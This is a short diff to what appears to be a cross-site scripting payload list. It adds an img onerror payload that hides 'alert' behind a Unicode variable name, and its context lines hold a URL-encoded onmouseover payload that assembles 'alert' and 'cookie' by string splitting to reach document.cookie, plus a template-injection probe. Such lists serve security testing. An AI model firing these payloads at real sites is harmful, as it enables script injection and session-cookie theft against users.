@@ -1,5 +1,7 @@
 '';!--"<XSS>=&{()}
 
+<img src=x onerror="ქ=alert;ქ('XSS')">
+
 "><a nope%3d"%26quot%3bx%26quot%3b"onmouseover%3d"Reflect.get(frames,'ale'%2b'rt')(Reflect.get(document,'coo'%2b'kie'))">
 
 '"><img src=x>${{7*2}}
